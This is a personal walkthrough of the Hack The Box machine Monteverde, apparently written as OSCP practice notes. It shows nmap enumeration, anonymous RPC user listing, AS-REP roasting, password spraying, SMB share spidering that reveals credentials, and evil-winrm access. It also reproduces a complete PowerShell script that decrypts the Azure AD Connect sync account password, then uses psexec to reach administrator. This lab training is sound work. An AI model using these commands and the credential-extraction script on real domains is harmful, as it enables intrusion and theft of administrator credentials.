---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Monteverde?sort_by=created_at&sort_type=desc
Difficulty: Medium
Featured:
aliases:
  - AD
---

---
# Information / Description

![](../../0.%20Assets/Monteverde-1791286711250.webp)

![328](../../0.%20Assets/Monteverde-1791286726528.webp)
---

# Walkthrough


Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts -vvv
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

With the ports in hand, I'll run a second, more detailed `nmap` scan.

```
nmap $T -Pn -n -sVC --min-rate 5000 -oN results.txt -vvv -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696
```

![](../../0.%20Assets/Monteverde-1791288777615.webp)

Let's add the domain name to `/etc/hosts` so `kerberos` authentication works correctly.

```
netexec smb $T
```

![](../../0.%20Assets/Monteverde-1791288836380.webp)

![](../../0.%20Assets/Monteverde-1791288996455.webp)

Let's see if anonymous enumeration gets us anywhere.

Anonymous access is allowed, but it shows no shares and no user enumeration.

![](../../0.%20Assets/Monteverde-1791289237358.webp)

So I moved to other protocols, like RPC.

```
rpcclient -U '' -N $T
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
rpcclient $> exit
```

We're allowed to enumerate users, so let's build a list with some `regex`.

```
rpcclient -U '' -N "$T" -c 'enumdomusers' | grep -oP 'user:\[\K[^]]+' > users.txt
```

![](../../0.%20Assets/Monteverde-1791289441999.webp)

The next logical step is to `as-rep` roast the users.

```
impacket-GetNPUsers 'MEGABANK.LOCAL/' \                           
  -usersfile users.txt \
  -no-pass \
  -dc-ip $T \
  -format hashcat \
  -outputfile asrep-impacket.txt
```

![](../../0.%20Assets/Monteverde-1791289516272.webp)

All of the users require preauth, so let's try to find credentials another way.

The first thing I did was check whether any of the users had a blank password.

```
netexec smb $T -u users.txt -p ''
```

No success.

![](../../0.%20Assets/Monteverde-1791289686628.webp)

Running low on ideas, I tried `ldapdomaindump` and collecting data with `bloodhound-python` using `anonymous` credentials, but neither worked. We still need a set of credentials: we have users, we just need a password.

So I resorted to something I dislike: `brute forcing`.

```
netexec smb $T -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success --ignore-pw-decoding
```

This was taking forever, so I tried spraying the list of users against itself as passwords.

```
netexec smb $T -u users.txt -p users.txt --continue-on-success --ignore-pw-decoding -t 50
```

![](../../0.%20Assets/Monteverde-1791291523487.webp)

That worked. Let's save the credentials to a file and see what we can do with them.

```
./nxcspray all $T -u 'SABatchJobs' -p 'SABatchJobs'
```

![](../../0.%20Assets/Monteverde-1791291890724.webp)

Let's see if this user has any shares.

```
netexec smb $T -u SABatchJobs -p 'SABatchJobs' --shares
```

![](../../0.%20Assets/Monteverde-1791291922071.webp)

Let's see what we can find.

```
netexec smb $T -u SABatchJobs -p 'SABatchJobs' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
```

![](../../0.%20Assets/Monteverde-1791291984110.webp)

![](../../0.%20Assets/Monteverde-1791292974326.webp)

This looks interesting, since it's a known user.

![](../../0.%20Assets/Monteverde-1791292989753.webp)

We have more credentials, so add them to the credential file.

![](../../0.%20Assets/Monteverde-1791294153840.webp)

And test them against every protocol.

```
./nxcspray all $T -u mhope -p '4n0therD4y@n0th3r$'
```

![](../../0.%20Assets/Monteverde-1791294279339.webp)

We have a way in.

```
evil-winrm -i $T -u mhope -p '4n0therD4y@n0th3r$'
```


![](../../0.%20Assets/Monteverde-1791294365066.webp)

	And we have the first flag.

While trying to get a reverse shell, I ran into this message.

![](../../0.%20Assets/Monteverde-1791294767838.webp)

I tried a few evasion techniques without luck, so we'll either get what we need without dropping a binary to disk or find it from outside the domain.

Let's do some `kerberoasting` and see if we need to pivot to another user.

![](../../0.%20Assets/Monteverde-1791296036593.webp)

No luck there, so let's test `ADCS`.

```
nxc ldap $T -d megabank.local -u mhope -p '4n0therD4y@n0th3r$' -M adcs
```

That didn't get us much, so let's check our privileges.

```
whoami /all
```

![](../../0.%20Assets/Monteverde-1791298242015.webp)

That's an unusual group. After some searching, we find it's tied to a service called `Azure AD`.

After a good bit more digging, I found this [website](https://blog.xpnsec.com/azuread-connect-for-redteam/).

It provides this script.
```
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

This script reads Azure AD Connect’s local database and uses its cryptographic library to decrypt the stored password for the Active Directory connector account. If it has sufficient access to the database and encryption keys, it prints the domain, username, and plaintext password.

After running it:

![](../../0.%20Assets/Monteverde-1791299596839.webp)

```
impacket-psexec MEGABANK.LOCAL/administrator:'d0m@in4dminyeah!'@$T
```

![](../../0.%20Assets/Monteverde-1791299665905.webp)